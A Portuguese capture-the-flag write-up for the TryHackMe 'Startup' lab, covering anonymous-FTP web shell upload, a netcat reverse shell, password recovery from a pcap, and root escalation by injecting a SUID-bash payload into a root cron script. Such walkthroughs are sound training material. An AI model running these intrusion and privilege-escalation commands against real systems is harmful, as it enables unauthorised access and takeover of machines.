Startup

TryHackMe · Easy by Brenno M.

Startup usa um diretório FTP com escrita mapeado para a web (upload de web shell PHP), análise de um pcap para recuperar uma senha e escalação por um script executado por cron do root.

Reconhecimento

O Nmap revela FTP, SSH e HTTP. O FTP aceita login anônimo e a pasta ftp tem permissão de escrita, servida em /files/ftp/ no web.

nmap -sS -sV -Pn <IP>
gobuster dir -u http://<IP> -w big.txt   # /files
ftp <IP>   # anonymous

Foothold

Sobe-se uma web shell PHP para a pasta gravável e dispara-se uma reverse shell como www-data, estabilizada com pty.

# via FTP: put shell.php  (em /files/ftp/)
nc -lvnp 4444
curl http://<IP>/files/ftp/shell.php
python3 -c 'import pty; pty.spawn("/bin/bash")'

Exfiltração / senha em pcap

Em /incidents há um suspicious.pcapng. Copiado para a pasta web e baixado, a análise revela a senha do usuário lennie, usada com su.

cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
# baixar e analisar no Wireshark -> senha
su lennie   # senha: <SENHA>

Escalação - cron

Um startup_list.txt atualizado a cada minuto indica um cron do root que executa /etc/print.sh (gravável por lennie). Injetando um payload no script, o cron do root o executa e entrega o root.

# lennie pode escrever em /etc/print.sh, chamado por planner.sh (root, a cada minuto)
echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > /etc/print.sh
# aguardar 1 min
/tmp/rootbash -p
cat /root/root.txt
